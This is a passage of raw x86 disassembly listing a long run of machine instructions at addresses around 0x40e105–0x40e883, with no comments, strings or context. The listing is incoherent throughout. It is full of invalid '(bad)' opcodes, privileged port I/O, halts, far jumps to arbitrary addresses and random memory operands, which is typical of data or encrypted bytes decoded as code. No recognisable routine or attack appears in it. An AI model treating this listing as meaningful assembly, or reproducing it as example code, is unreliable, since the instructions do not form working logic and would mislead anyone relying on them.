  40e105:	add    eax,0xc0b34999
  40e10a:	call   0xbabafc72
  40e10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e110:	stos   DWORD PTR es:[edi],eax
  40e111:	pop    esi
  40e112:	pop    es
  40e113:	enter  0xfc90,0xc
  40e117:	pop    esi
  40e118:	dec    eax
  40e119:	cmp    DWORD PTR [ebp-0x2256a453],edx
  40e11f:	lea    ecx,[ecx+0x2c]
  40e122:	(bad)  
  40e123:	enter  0x19c2,0xc4
  40e127:	fidiv  DWORD PTR [edx-0x7156db63]
  40e12e:	pop    edi
  40e12f:	cs dec esi
  40e131:	push   0xffffffb2
  40e133:	sti    
  40e134:	retf   0x8baa
  40e137:	cmc    
  40e138:	xor    BYTE PTR [edx+eiz*2+0xedbe86b],cl
  40e13f:	mov    ds:0xc6df746b,eax
  40e144:	cmp    al,0x5a
  40e146:	or     ch,BYTE PTR [edx]
  40e148:	popf   
  40e149:	mov    ds:0x53861c6e,al
  40e14e:	ret    
  40e14f:	lds    edi,FWORD PTR [edx]
  40e151:	xchg   ecx,eax
  40e152:	adc    DWORD PTR [ecx+0x7e],ecx
  40e155:	ins    DWORD PTR es:[edi],dx
  40e156:	pop    edx
  40e157:	mov    bl,0xbf
  40e159:	out    dx,al
  40e15a:	push   ds
  40e15b:	mov    dl,0xb0
  40e15d:	pop    esp
  40e15e:	(bad)  
  40e15f:	adc    ch,cl
  40e161:	stc    
  40e162:	fadd   QWORD PTR [eax-0xf684650]
  40e168:	inc    ecx
  40e169:	pop    esp
  40e16a:	les    ecx,FWORD PTR [eax+0x677a5817]
  40e170:	sbb    al,BYTE PTR [ecx-0x226579a5]
  40e176:	xchg   ebx,eax
  40e177:	dec    ebp
  40e178:	mov    dh,0xaa
  40e17a:	pop    eax
  40e17b:	retf   
  40e17c:	dec    ebx
  40e17d:	xor    cl,BYTE PTR [eax]
  40e17f:	mov    esp,0x999e0f32
  40e184:	rcl    cl,1
  40e186:	mov    fs,edx
  40e188:	mov    esi,0xb871fa7
  40e18d:	push   esi
  40e18e:	jge    0x40e16f
  40e190:	fdivr  QWORD PTR [esi]
  40e192:	cmp    edx,DWORD PTR [edi+0x79]
  40e195:	ret    0xec56
  40e198:	jae    0x40e20c
  40e19a:	mov    ds:0x4bb8b7a5,eax
  40e19f:	pop    esi
  40e1a0:	push   ebp
  40e1a1:	gs mov bx,ds
  40e1a5:	ss xchg edx,eax
  40e1a7:	stos   DWORD PTR es:[edi],eax
  40e1a8:	xor    eax,0xa27abdf0
  40e1ad:	ret    0x7c22
  40e1b0:	pop    edi
  40e1b1:	dec    ebx
  40e1b2:	(bad)  
  40e1b3:	hlt    
  40e1b4:	fs xchg ebp,eax
  40e1b6:	out    dx,eax
  40e1b7:	sbb    BYTE PTR [esi-0x24],cl
  40e1ba:	xchg   BYTE PTR [ebx+0x67],dh
  40e1bd:	in     al,dx
  40e1be:	ins    DWORD PTR es:[edi],dx
  40e1bf:	les    esi,FWORD PTR [eax-0x493597fe]
  40e1c5:	xor    DWORD PTR [edx],edx
  40e1c7:	xchg   edi,eax
  40e1c8:	ds pushf 
  40e1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1cb:	mov    ebx,0x627ccad2
  40e1d0:	aaa    
  40e1d1:	add    al,0x59
  40e1d3:	es arpl sp,ax
  40e1d6:	xchg   ecx,eax
  40e1d7:	jns    0x40e210
  40e1d9:	test   al,0xe2
  40e1db:	fistp  DWORD PTR [edx]
  40e1dd:	jno    0x40e1e7
  40e1df:	inc    eax
  40e1e0:	fnstcw WORD PTR [eax+ecx*8-0x32]
  40e1e4:	imul   edx,DWORD PTR [ebx+ebx*4-0x7f2ae901],0x5de57f0
  40e1ef:	mov    ds:0x4f90b4f,al
  40e1f4:	mov    edx,0x6ee17759
  40e1f9:	xchg   ecx,eax
  40e1fa:	add    BYTE PTR [edi],bl
  40e1fc:	fimul  WORD PTR [ebp+eax*8-0x17caf053]
  40e203:	jae    0x40e190
  40e205:	or     eax,0x8029004b
  40e20a:	mov    BYTE PTR [ebp+0x25249d37],dl
  40e210:	pop    eax
  40e211:	das    
  40e212:	cmp    dh,BYTE PTR [eax-0x77]
  40e215:	sub    eax,0x3d8b5b0d
  40e21a:	cmp    dl,BYTE PTR [ebx]
  40e21c:	push   ss
  40e21d:	and    esi,DWORD PTR [edx-0x2a]
  40e220:	xchg   edx,eax
  40e221:	jns    0x40e1be
  40e223:	nop
  40e224:	jl     0x40e22e
  40e226:	push   ss
  40e227:	or     ch,BYTE PTR [esi+edi*8+0x45]
  40e22b:	dec    eax
  40e22c:	ins    BYTE PTR es:[edi],dx
  40e22d:	les    ecx,FWORD PTR [edx]
  40e22f:	mov    eax,DWORD PTR [edi+0x3826fa55]
  40e235:	xchg   edx,eax
  40e236:	adc    al,0x96
  40e238:	into   
  40e239:	jp     0x40e1c0
  40e23b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e23c:	sar    BYTE PTR [edi+0x5d7ec498],cl
  40e242:	push   ebp
  40e243:	xlat   BYTE PTR ds:[ebx]
  40e244:	mov    ebx,0x7de659b4
  40e249:	lds    ebp,FWORD PTR ss:[ebx+0x2a1d06e6]
  40e250:	mov    eax,ds:0x25d00bed
  40e255:	fwait
  40e256:	mov    eax,ds:0x4c807721
  40e25b:	xchg   esi,eax
  40e25c:	xchg   ebx,eax
  40e25d:	aas    
  40e25e:	xor    bl,BYTE PTR [esi+eax*1+0x2a]
  40e262:	mov    bh,0x85
  40e264:	push   0x7e8d8eea
  40e269:	cmp    al,bl
  40e26b:	jmp    0x40e2d8
  40e26d:	xchg   ecx,eax
  40e26e:	sub    ah,0x59
  40e271:	jp     0x40e2d3
  40e273:	fisubr WORD PTR ds:0x829341fa
  40e279:	adc    al,0x28
  40e27b:	int    0xf5
  40e27d:	inc    eax
  40e27e:	ja     0x40e29c
  40e280:	repz mov al,ds:0xef7053ec
  40e286:	aas    
  40e287:	push   edx
  40e288:	mov    edx,0x53c07370
  40e28d:	push   ss
  40e28e:	sti    
  40e28f:	add    eax,esp
  40e291:	inc    esp
  40e292:	lea    ebp,[edi+0x37353c11]
  40e298:	xor    eax,0xec2eb43b
  40e29d:	ja     0x40e31e
  40e29f:	mov    bl,0xa3
  40e2a1:	dec    edx
  40e2a2:	dec    edx
  40e2a3:	fadd   QWORD PTR [eax+0xc541df4]
  40e2a9:	mov    eax,0x8f7ea5fc
  40e2ae:	(bad)  
  40e2af:	sub    eax,0xe46c6020
  40e2b4:	fistp  WORD PTR [eax+0x5a]
  40e2b7:	push   0x386e5e5c
  40e2bc:	push   edx
  40e2bd:	(bad)  
  40e2be:	or     DWORD PTR [edi],0xffffffb3
  40e2c1:	repnz ficomp WORD PTR [ebp+0x4a]
  40e2c5:	xchg   edi,eax
  40e2c6:	fisttp WORD PTR ds:0x96a384ab
  40e2cc:	aas    
  40e2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2ce:	inc    eax
  40e2cf:	push   es
  40e2d0:	and    BYTE PTR [esi-0x51],0xcc
  40e2d4:	fnstsw WORD PTR [edx]
  40e2d6:	dec    esi
  40e2d7:	repz xor al,0xe7
  40e2da:	iret   
  40e2db:	icebp  
  40e2dc:	in     eax,dx
  40e2dd:	rcr    DWORD PTR [edx],1
  40e2df:	or     eax,0xe5815655
  40e2e4:	and    BYTE PTR [ebp+0x18],dh
  40e2e7:	ins    BYTE PTR es:[edi],dx
  40e2e8:	ret    0xf05a
  40e2eb:	sbb    DWORD PTR [ecx],ebp
  40e2ed:	xchg   BYTE PTR [esi+ebp*1],dh
  40e2f0:	xchg   edx,eax
  40e2f1:	fcmovbe st,st(7)
  40e2f3:	add    ebx,esi
  40e2f5:	out    0x3,al
  40e2f7:	jns    0x40e29e
  40e2f9:	sub    ebx,DWORD PTR [ebx+0xf6ed9ee]
  40e2ff:	jg     0x40e2ea
  40e301:	jb     0x40e31b
  40e303:	adc    BYTE PTR [ecx],bh
  40e305:	cmp    ecx,DWORD PTR [esi-0x641af5b6]
  40e30b:	push   edi
  40e30c:	ja     0x40e370
  40e30e:	arpl   WORD PTR cs:[edi],di
  40e311:	sbb    esi,DWORD PTR [edi]
  40e313:	jbe    0x40e333
  40e315:	cmp    DWORD PTR [edx],esi
  40e317:	sbb    BYTE PTR [ecx],ch
  40e319:	dec    edi
  40e31a:	aad    0x92
  40e31c:	mov    cl,0xad
  40e31e:	sti    
  40e31f:	lock xchg esp,eax
  40e321:	pop    es
  40e322:	xchg   DWORD PTR [edi],esp
  40e324:	test   al,0xeb
  40e326:	push   cs
  40e327:	xchg   esp,eax
  40e328:	pop    es
  40e329:	push   edi
  40e32a:	jg     0x40e399
  40e32c:	sub    eax,0x3a1eafcf
  40e331:	rcl    DWORD PTR [edx+ebp*4+0x2b366d11],0x79
  40e339:	xchg   ecx,eax
  40e33a:	pop    ecx
  40e33b:	dec    edi
  40e33c:	test   al,0x5e
  40e33e:	stos   BYTE PTR es:[edi],al
  40e33f:	outs   dx,BYTE PTR ds:[esi]
  40e340:	add    bl,BYTE PTR [eax-0x32]
  40e343:	inc    esp
  40e344:	mov    cl,0x82
  40e346:	mov    ecx,eax
  40e348:	inc    eax
  40e349:	add    ebx,edi
  40e34b:	add    al,0xef
  40e34d:	or     BYTE PTR [ebp-0x6],ah
  40e350:	in     eax,dx
  40e351:	xchg   BYTE PTR [edi],bh
  40e353:	mov    cl,0x68
  40e355:	push   edi
  40e356:	mov    al,ds:0x85f8821
  40e35b:	pop    ebx
  40e35c:	pushf  
  40e35d:	mov    dl,0x9b
  40e35f:	jno    0x40e351
  40e361:	fnstcw WORD PTR [ebp+ecx*4+0x6f]
  40e365:	stos   DWORD PTR es:[edi],eax
  40e366:	rol    BYTE PTR [ecx],0x82
  40e369:	xchg   ecx,eax
  40e36a:	xor    edi,ecx
  40e36c:	ret    0x8e77
  40e36f:	jl     0x40e34e
  40e371:	or     ah,BYTE PTR [ebp-0x241ebd66]
  40e377:	jb     0x40e339
  40e379:	xor    esp,DWORD PTR [esi+0x40]
  40e37c:	mov    edi,0x669dfcd9
  40e381:	scas   al,BYTE PTR es:[edi]
  40e382:	sub    BYTE PTR ds:0x4225fbac,dl
  40e388:	fcomp  DWORD PTR [ebx+0x1ee7736e]
  40e38e:	cli    
  40e38f:	adc    ah,ch
  40e391:	mov    cl,0x18
  40e393:	pop    eax
  40e394:	jmp    0x40e3e8
  40e396:	retf   
  40e397:	mov    dl,0xcb
  40e399:	pop    esi
  40e39a:	sub    eax,0xeb57ac89
  40e39f:	fild   WORD PTR [edx]
  40e3a1:	or     eax,0xf3ca9638
  40e3a6:	dec    bl
  40e3a8:	mov    ebp,0x7928fea6
  40e3ad:	loop   0x40e370
  40e3af:	or     ah,BYTE PTR [esi-0x24772722]
  40e3b5:	out    dx,al
  40e3b6:	(bad)  
  40e3b8:	xor    dh,BYTE PTR [edx-0x29]
  40e3bb:	ss mov dl,0xaa
  40e3be:	push   0x44
  40e3c0:	or     eax,0xf099d245
  40e3c5:	or     esi,DWORD PTR [esp+esi*1+0x1bdbd9bd]
  40e3cc:	inc    edi
  40e3cd:	(bad)  
  40e3ce:	mov    ecx,0x1d983c54
  40e3d3:	lds    esp,FWORD PTR [ebx]
  40e3d5:	mov    ebp,0xaf015c07
  40e3da:	sti    
  40e3db:	jmp    0x40e3cc
  40e3dd:	sar    ch,0xb2
  40e3e0:	gs (bad) 
  40e3e2:	push   edx
  40e3e3:	inc    ebx
  40e3e4:	add    BYTE PTR [esi-0x55037955],bl
  40e3ea:	add    al,0x60
  40e3ec:	mov    eax,ds:0x84d3d37a
  40e3f1:	jne    0x40e3ea
  40e3f3:	stc    
  40e3f4:	xchg   ebx,eax
  40e3f5:	test   BYTE PTR [ebp+0x36],0x41
  40e3f9:	inc    esi
  40e3fa:	fs jns 0x40e46a
  40e3fd:	add    esp,DWORD PTR [edi]
  40e3ff:	das    
  40e400:	add    al,0xb9
  40e402:	les    esi,FWORD PTR [eax+0x7d]
  40e405:	and    bh,BYTE PTR [ebx-0x3574b27]
  40e40b:	fwait
  40e40c:	and    bl,BYTE PTR [ebx+0x6c44c970]
  40e412:	or     DWORD PTR [ecx+0x3b4691c3],esi
  40e418:	scas   eax,DWORD PTR es:[edi]
  40e419:	imul   edi,DWORD PTR [ecx+0x485d8e8],0x183b18be
  40e423:	or     DWORD PTR [edx+0x180d0604],0x6520547d
  40e42d:	ins    DWORD PTR es:[edi],dx
  40e42e:	jbe    0x40e3dd
  40e430:	xor    ebx,ebp
  40e432:	xor    ecx,DWORD PTR [ebx-0x2fa80beb]
  40e438:	cmc    
  40e439:	inc    eax
  40e43a:	jmp    0x40e4ab
  40e43c:	sbb    bh,dl
  40e43e:	ror    BYTE PTR [esi-0x4b992c1f],1
  40e444:	and    eax,0xcce6d379
  40e449:	jecxz  0x40e475
  40e44b:	jmp    0x40e431
  40e44d:	stos   BYTE PTR es:[edi],al
  40e44e:	jmp    0x80639ca9
  40e453:	stc    
  40e454:	and    bh,ah
  40e456:	push   ds
  40e457:	jge    0x40e41a
  40e459:	cdq    
  40e45a:	addr16 xor cl,ch
  40e45d:	mov    ds:0x39bdeae4,eax
  40e462:	arpl   dx,si
  40e464:	cmp    ah,bh
  40e466:	lds    esi,FWORD PTR [edx+edi*4-0x3c164b12]
  40e46d:	test   BYTE PTR ds:0xd3877487,0xb4
  40e474:	out    0xf1,eax
  40e476:	mov    ds:0xeb9827f0,eax
  40e47b:	xchg   ebp,eax
  40e47c:	shl    DWORD PTR [ebx+0x31],0x69
  40e480:	(bad)  
  40e481:	das    
  40e482:	mov    ch,0xbb
  40e484:	or     al,0xbf
  40e486:	icebp  
  40e487:	es push ss
  40e489:	mov    ecx,0x696a56ed
  40e48e:	mov    eax,ds:0x18c408b
  40e493:	scas   eax,DWORD PTR es:[edi]
  40e494:	arpl   WORD PTR [ebx+0x1c],bx
  40e497:	mov    dl,0xa1
  40e499:	sbb    dh,BYTE PTR [ebp+0x75177d14]
  40e49f:	les    edi,FWORD PTR fs:[edx]
  40e4a2:	iret   
  40e4a3:	leave  
  40e4a4:	fsubr  st(3),st
  40e4a6:	and    esi,DWORD PTR [edi+0x426b8f4f]
  40e4ac:	push   esp
  40e4ad:	aaa    
  40e4ae:	pop    edi
  40e4af:	mov    ah,0x96
  40e4b1:	and    al,0x8f
  40e4b3:	or     eax,0xb140cdb0
  40e4b8:	(bad)  
  40e4b9:	or     edi,DWORD PTR [ecx-0x5b7d3a8c]
  40e4bf:	push   ebx
  40e4c0:	rcr    BYTE PTR [edx+eax*4],0x79
  40e4c4:	mov    dl,0x59
  40e4c6:	lahf   
  40e4c7:	mov    ch,0x28
  40e4c9:	ja     0x40e479
  40e4cb:	out    dx,eax
  40e4cc:	xor    al,0x6c
  40e4ce:	add    al,0xd0
  40e4d0:	fisttp QWORD PTR [edi+edi*1+0x33]
  40e4d4:	fist   DWORD PTR [ebx-0xa807859]
  40e4da:	int    0x37
  40e4dc:	jne    0x40e4cb
  40e4de:	push   esp
  40e4df:	es mov ecx,0xe811ddcf
  40e4e5:	loope  0x40e4b8
  40e4e7:	dec    esi
  40e4e8:	dec    ecx
  40e4e9:	mov    bh,0xbc
  40e4eb:	push   cs
  40e4ec:	sub    BYTE PTR [ecx-0x68],bl
  40e4ef:	adc    DWORD PTR [edi+0x25],edx
  40e4f2:	ins    BYTE PTR es:[edi],dx
  40e4f3:	les    ecx,FWORD PTR [ecx+0x4a]
  40e4f6:	pop    ss
  40e4f7:	or     BYTE PTR [eax],ah
  40e4f9:	add    esp,DWORD PTR [ebp+0x52]
  40e4fc:	xchg   edi,eax
  40e4fd:	rcl    DWORD PTR [edx+esi*4+0x41],cl
  40e501:	pop    esi
  40e502:	add    eax,0x9cd2a7e7
  40e507:	add    eax,0xfd6c0355
  40e50c:	ins    BYTE PTR es:[edi],dx
  40e50d:	ja     0x40e542
  40e50f:	neg    DWORD PTR [edi-0xc]
  40e512:	pop    es
  40e513:	aas    
  40e514:	push   ss
  40e515:	mov    BYTE PTR [ebx-0x2a],0x27
  40e519:	pop    ss
  40e51a:	push   ecx
  40e51b:	repnz in al,0x7d
  40e51e:	dec    esi
  40e51f:	jle    0x40e567
  40e521:	xlat   BYTE PTR ds:[ebx]
  40e522:	(bad)  
  40e523:	jle    0x40e512
  40e525:	inc    ebx
  40e526:	test   DWORD PTR [edi+eax*2-0x1d],ecx
  40e52a:	xchg   BYTE PTR [eax+edi*1],bl
  40e52d:	and    esp,DWORD PTR [edi+0x246154af]
  40e533:	inc    edi
  40e534:	das    
  40e535:	pusha  
  40e536:	xor    ebp,DWORD PTR [eax+0x2cc99123]
  40e53c:	shr    BYTE PTR [ebx-0x48],cl
  40e53f:	ins    BYTE PTR es:[edi],dx
  40e540:	ret    
  40e541:	mov    al,ds:0x44d73038
  40e546:	pop    es
  40e547:	or     BYTE PTR [esp+ecx*2-0x4557081f],0x7b
  40e54f:	daa    
  40e550:	and    DWORD PTR [ebx],edx
  40e552:	push   0xffffffa3
  40e554:	inc    ebp
  40e555:	in     eax,dx
  40e556:	addr16 loop 0x40e510
  40e559:	mov    cl,0x64
  40e55b:	xchg   edx,eax
  40e55c:	xchg   ebp,eax
  40e55d:	lock push cs
  40e55f:	loop   0x40e567
  40e561:	imul   edx,DWORD PTR [edx],0xbcbb8604
  40e567:	jns    0x40e5ab
  40e569:	(bad)  [esi+0x4c]
  40e56c:	mov    ?,WORD PTR [edx+0x51]
  40e56f:	aad    0xec
  40e571:	xlat   BYTE PTR ds:[ebx]
  40e572:	in     al,0x9
  40e574:	xor    ah,BYTE PTR [edi+0x74e5d1a0]
  40e57a:	xchg   edx,eax
  40e57b:	test   al,0xc7
  40e57d:	xchg   edi,eax
  40e57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e57f:	and    BYTE PTR [eax-0x34],0x26
  40e583:	cmp    ebx,DWORD PTR [edx+ecx*8+0x295e008]
  40e58a:	repnz lock stos DWORD PTR es:[edi],eax
  40e58d:	cli    
  40e58e:	cmp    cl,BYTE PTR [ebp-0x4]
  40e591:	cli    
  40e592:	js     0x40e52a
  40e594:	cmp    eax,0xee3519f8
  40e599:	jecxz  0x40e5d2
  40e59b:	sub    BYTE PTR [edi],0xa8
  40e59e:	(bad)  
  40e59f:	out    0xba,al
  40e5a1:	push   eax
  40e5a2:	aam    0xec
  40e5a4:	fisttp DWORD PTR [edi-0x1bd0cb8d]
  40e5aa:	mov    al,ds:0x82b9e77a
  40e5af:	es paddsw mm5,mm3
  40e5b3:	fcomp  QWORD PTR [ecx+0x2180c344]
  40e5b9:	fidivr DWORD PTR [edx+0x63]
  40e5bc:	xchg   esi,eax
  40e5bd:	xchg   ebp,eax
  40e5be:	leave  
  40e5bf:	push   ds
  40e5c0:	mov    esp,0x712f2c1c
  40e5c5:	cmp    edi,0x1a
  40e5c8:	mov    edx,0x1e8b8b0f
  40e5cd:	data16 mov bl,0x57
  40e5d0:	je     0x40e5a9
  40e5d2:	in     al,0xd6
  40e5d4:	cwde   
  40e5d5:	les    esp,FWORD PTR [ecx+0x771b7116]
  40e5db:	aad    0x6b
  40e5dd:	push   0xfffffffa
  40e5df:	xor    edi,DWORD PTR [edi]
  40e5e1:	mov    ds:0xd4f8cedd,eax
  40e5e6:	dec    esi
  40e5e7:	jne    0x40e637
  40e5e9:	pop    ebx
  40e5ea:	xchg   esi,eax
  40e5eb:	add    DWORD PTR [esi+0x1032c237],0xec2fd542
  40e5f5:	shl    DWORD PTR [ecx+0xd58f083],cl
  40e5fb:	push   esi
  40e5fc:	pusha  
  40e5fd:	ja     0x40e58e
  40e5ff:	fimul  DWORD PTR [edx+0x2d]
  40e602:	add    esp,esp
  40e604:	adc    BYTE PTR [edx+edx*8],0xbb
  40e608:	pop    ds
  40e609:	jge    0x40e685
  40e60b:	mov    ds:0x2b8537cd,al
  40e610:	icebp  
  40e611:	fldcw  WORD PTR [ecx-0x29dbd703]
  40e617:	js     0x40e683
  40e619:	in     eax,0x81
  40e61b:	rcl    bh,cl
  40e61d:	mov    edi,DWORD PTR [eiz*8-0x2dadddf3]
  40e624:	ss inc edi
  40e626:	sbb    ah,al
  40e628:	or     bl,BYTE PTR [edx]
  40e62a:	cdq    
  40e62b:	hlt    
  40e62c:	jmp    0xe39d:0x102663bf
  40e633:	ret    0x924
  40e636:	xor    edx,edi
  40e638:	retf   0x7b54
  40e63b:	loop   0x40e621
  40e63d:	inc    esp
  40e63e:	pop    eax
  40e63f:	cmc    
  40e640:	adc    dl,BYTE PTR [ebp-0x73f8d094]
  40e646:	dec    dh
  40e648:	aaa    
  40e649:	lods   eax,DWORD PTR ds:[esi]
  40e64a:	mov    cl,0x9f
  40e64c:	jecxz  0x40e5d1
  40e64e:	les    ebx,FWORD PTR [ebx]
  40e650:	mov    bh,0x7f
  40e652:	(bad)  
  40e653:	sub    BYTE PTR [ecx],dl
  40e655:	es retf 0x31d3
  40e659:	inc    esi
  40e65a:	jle    0x40e5ee
  40e65c:	xlat   BYTE PTR ds:[ebx]
  40e65d:	jl     0x40e697
  40e65f:	jne    0x40e5ed
  40e661:	mov    edx,0x3e2fde9
  40e666:	repnz (bad) 
  40e669:	loope  0x40e6e3
  40e66b:	test   eax,ecx
  40e66d:	leave  
  40e66e:	mov    bh,0x4e
  40e670:	out    0x17,al
  40e672:	dec    edx
  40e673:	inc    ecx
  40e674:	fsub   DWORD PTR [ebp-0x56]
  40e677:	adc    eax,0x1f562c69
  40e67c:	leave  
  40e67d:	xor    eax,DWORD PTR [eax-0x1488360b]
  40e683:	jbe    0x40e68b
  40e685:	leave  
  40e686:	xor    eax,0x2cb692b2
  40e68b:	mov    al,ds:0xac4104b6
  40e690:	aad    0x49
  40e692:	pop    ds
  40e693:	leave  
  40e694:	nop
  40e695:	inc    ebx
  40e696:	out    dx,al
  40e697:	out    0xf3,eax
  40e699:	mov    cl,0x76
  40e69b:	or     ebx,DWORD PTR [ebx]
  40e69d:	pushf  
  40e69e:	sbb    eax,0xc33fb60d
  40e6a3:	jmp    0x40e70b
  40e6a5:	xor    al,0x20
  40e6a7:	cmp    DWORD PTR [esi+0x53],edi
  40e6aa:	push   ebx
  40e6ab:	inc    edi
  40e6ac:	imul   DWORD PTR cs:[ebx-0x4cb3354b]
  40e6b3:	outs   dx,BYTE PTR ds:[esi]
  40e6b4:	sub    BYTE PTR [edx+edi*1],dl
  40e6b7:	fwait
  40e6b8:	xchg   ebx,eax
  40e6b9:	xchg   edx,eax
  40e6ba:	lea    ecx,[eax]
  40e6bc:	ss popa 
  40e6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6bf:	addr16 sub al,0x3
  40e6c2:	loopne 0x40e71d
  40e6c4:	or     BYTE PTR [eax+0x25664e61],bl
  40e6ca:	mov    edi,0xb6c1e206
  40e6cf:	jl     0x40e66f
  40e6d1:	pop    ss
  40e6d2:	dec    esp
  40e6d3:	adc    edx,DWORD PTR [edi+eiz*1+0x5ab324f2]
  40e6da:	add    al,0xff
  40e6dc:	and    BYTE PTR [esi+0x2b6a0279],bh
  40e6e2:	retf   
  40e6e3:	out    dx,al
  40e6e4:	rcl    BYTE PTR [ebx-0x4a],cl
  40e6e7:	sub    esi,eax
  40e6e9:	imul   esi,DWORD PTR [eax],0x7d
  40e6ec:	daa    
  40e6ed:	xor    eax,0xa0f2e580
  40e6f2:	jbe    0x40e681
  40e6f4:	jb     0x40e74c
  40e6f6:	into   
  40e6f7:	xor    eax,0x857a8c63
  40e6fc:	ds pop edx
  40e6fe:	test   BYTE PTR [edx+eax*8-0x2f700c29],0xbe
  40e706:	inc    edi
  40e707:	fisttp DWORD PTR [esi+0x6]
  40e70a:	or     BYTE PTR [edx-0x2587b51a],0x9
  40e711:	inc    ecx
  40e712:	icebp  
  40e713:	xchg   edx,eax
  40e714:	sti    
  40e715:	ror    BYTE PTR [esi-0x25],0x2d
  40e719:	mov    esi,0x246d97a3
  40e71e:	iret   
  40e71f:	arpl   WORD PTR [ebx-0x6b],ax
  40e722:	aam    0xc
  40e724:	add    DWORD PTR [ebx],ebp
  40e726:	dec    ecx
  40e727:	popa   
  40e728:	mov    WORD PTR [eax],ss
  40e72a:	jl     0x40e750
  40e72c:	hlt    
  40e72d:	adc    eax,0x51639d93
  40e732:	adc    eax,0xfd482916
  40e737:	mov    ebx,0xe377e4ec
  40e73c:	mov    cl,0x7c
  40e73e:	nop
  40e73f:	and    bh,dl
  40e741:	push   cs
  40e742:	xchg   ecx,eax
  40e743:	int    0x58
  40e745:	arpl   WORD PTR [edi+ebp*4-0x4c6dc54b],bx
  40e74c:	fcmovnu st,st(4)
  40e74e:	inc    ebx
  40e74f:	push   eax
  40e750:	and    DWORD PTR ds:0xaf4bfd2a,edi
  40e756:	xchg   edx,eax
  40e757:	xchg   edi,eax
  40e758:	(bad)  
  40e759:	aad    0x31
  40e75b:	dec    ebx
  40e75c:	sbb    al,0x69
  40e75e:	xlat   BYTE PTR ds:[ebx]
  40e75f:	pop    ebx
  40e760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e761:	test   ch,0x93
  40e764:	ins    BYTE PTR es:[edi],dx
  40e765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e766:	nop
  40e767:	enter  0xbd4b,0xaf
  40e76b:	mov    edi,0x87c708be
  40e770:	std    
  40e771:	push   cs
  40e772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e773:	ret    
  40e774:	xchg   BYTE PTR [ebp+0x66],dl
  40e777:	pop    es
  40e778:	jl     0x40e72a
  40e77a:	jb     0x40e7ee
  40e77c:	fstp   DWORD PTR [esi+0x289f4089]
  40e782:	(bad)  
  40e783:	aaa    
  40e784:	lock es jge 0x40e799
  40e788:	inc    eax
  40e789:	push   ebp
  40e78a:	dec    ebx
  40e78b:	sbb    BYTE PTR [ecx],bl
  40e78d:	push   edx
  40e78e:	adc    edi,esi
  40e790:	imul   edi,esp,0xa6be6bce
  40e796:	ret    0x60ea
  40e799:	or     bh,BYTE PTR [ecx]
  40e79b:	cmp    al,BYTE PTR [ebp-0x2f]
  40e79e:	ret    
  40e79f:	push   edx
  40e7a0:	cmp    dh,cl
  40e7a2:	or     ebp,edx
  40e7a4:	daa    
  40e7a5:	jne    0x40e803
  40e7a7:	leave  
  40e7a8:	test   edi,esp
  40e7aa:	fcom   DWORD PTR [edx+0xc]
  40e7ad:	inc    ebx
  40e7ae:	jns    0x40e736
  40e7b0:	push   0x41
  40e7b2:	pop    ss
  40e7b3:	sbb    ch,cl
  40e7b5:	push   0xcc98eb8b
  40e7ba:	xadd   BYTE PTR [ebx+0x4288c914],dh
  40e7c1:	ss addr16 push ds
  40e7c4:	imul   ecx,DWORD PTR [edx-0x5e61b181],0x93e639e5
  40e7ce:	es push ss
  40e7d0:	into   
  40e7d1:	sbb    edx,DWORD PTR [edi]
  40e7d3:	clc    
  40e7d4:	loope  0x40e81b
  40e7d6:	out    dx,eax
  40e7d7:	jge    0x40e7b8
  40e7d9:	repnz in al,0x13
  40e7dc:	icebp  
  40e7dd:	lods   eax,DWORD PTR ds:[esi]
  40e7de:	cmp    al,0x46
  40e7e0:	cmp    ch,BYTE PTR [esi+0x5d8c315e]
  40e7e6:	add    BYTE PTR [esi+0xe],ah
  40e7e9:	and    BYTE PTR [edx-0x54d98aad],bh
  40e7ef:	jge    0x40e79b
  40e7f1:	xchg   BYTE PTR [eax],dh
  40e7f3:	dec    esp
  40e7f4:	pop    ebx
  40e7f5:	push   eax
  40e7f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7f7:	retf   0x5eb8
  40e7fa:	icebp  
  40e7fb:	popa   
  40e7fc:	jbe    0x40e7b0
  40e7fe:	popa   
  40e7ff:	into   
  40e800:	dec    ebp
  40e801:	or     esi,DWORD PTR gs:[ebx+0x6bdcbb6b]
  40e808:	retf   
  40e809:	mov    eax,ds:0xe934f8ec
  40e80e:	mov    esi,0xec5968bf
  40e813:	daa    
  40e814:	test   dl,bl
  40e816:	pop    edx
  40e817:	push   esi
  40e818:	add    dh,BYTE PTR [edi+0x52e1222c]
  40e81e:	in     eax,0x87
  40e820:	sbb    BYTE PTR [edx+0x67603d13],dh
  40e826:	jmp    0x40e8a7
  40e828:	imul   DWORD PTR [ebp-0x240eb3cb]
  40e82e:	ss jne 0x40e85b
  40e831:	lahf   
  40e832:	mov    ah,0xb0
  40e834:	js     0x40e8ac
  40e836:	pop    esi
  40e837:	dec    ecx
  40e838:	mul    BYTE PTR [ebx]
  40e83a:	or     esp,DWORD PTR ds:0x5a4188bd
  40e840:	cld    
  40e841:	cmp    DWORD PTR [eax],ebx
  40e843:	ficom  WORD PTR [ebp+0x2f9b420]
  40e849:	sar    DWORD PTR [ebp-0x1a1b934a],cl
  40e84f:	and    al,0xc
  40e851:	push   ecx
  40e852:	aam    0x65
  40e854:	push   es
  40e855:	(bad)  
  40e856:	cmp    BYTE PTR [ebp-0x238cfa33],dl
  40e85c:	inc    edx
  40e85d:	add    DWORD PTR [ebp+edx*1-0x24],0x77
  40e862:	fmul   QWORD PTR [esi-0x6713cd66]
  40e868:	inc    ebx
  40e869:	out    0xa5,al
  40e86b:	fpatan 
  40e86d:	aaa    
  40e86e:	loope  0x40e872
  40e870:	ds mov bl,0x51
  40e873:	dec    DWORD PTR [edx]
  40e875:	sbb    bh,BYTE PTR es:[ebp-0x2a]
  40e879:	ret    0xf0f1
  40e87c:	enter  0x8a97,0xa3
  40e880:	lods   al,BYTE PTR ds:[esi]
  40e881:	cmp    al,0x77
  40e883:	dec    eax
